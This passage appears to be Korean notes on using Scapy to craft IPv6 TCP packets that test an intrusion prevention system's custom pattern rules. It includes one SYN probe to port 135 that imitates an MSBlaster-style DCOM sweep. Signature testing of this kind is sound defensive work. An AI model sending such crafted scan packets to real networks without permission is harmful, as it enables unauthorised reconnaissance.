p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IPv6(src="::ffff:a00:31f", dst="::ffff:a00:1e72")/TCP(sport=1025, dport=80, flags="PA")/"KimJungWoo"  
sendp(p1, count=1)

6. 패턴블럭/사용자정의 - TCP 80, www.wins21.co.kr 패턴
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IPv6(src="::ffff:a00:31f", dst="::ffff:a00:1e72")/TCP(sport=1025, dport=80, flags="PA")/"www.wins21.co.kr"  
혹은
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IPv6(src="::ffff:a00:31f", dst="::ffff:a00:1e72")/TCP(sport=1025, dport=80, flags="PA")/"GET /index.html HTTP/1.0\r\nHost: www.wins21.co.kr\r\n\r\n"  
sendp(p1, count=1)


번외 1. 정보수집 - Dcom_TCP_Sweep(MSBlaster Worm, Messenger...)
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IPv6(src="::ffff:a00:31f", dst="::ffff:a00:1e72")/TCP(sport=1025, dport=135, flags="S")
sendp(p1, verbose=0)















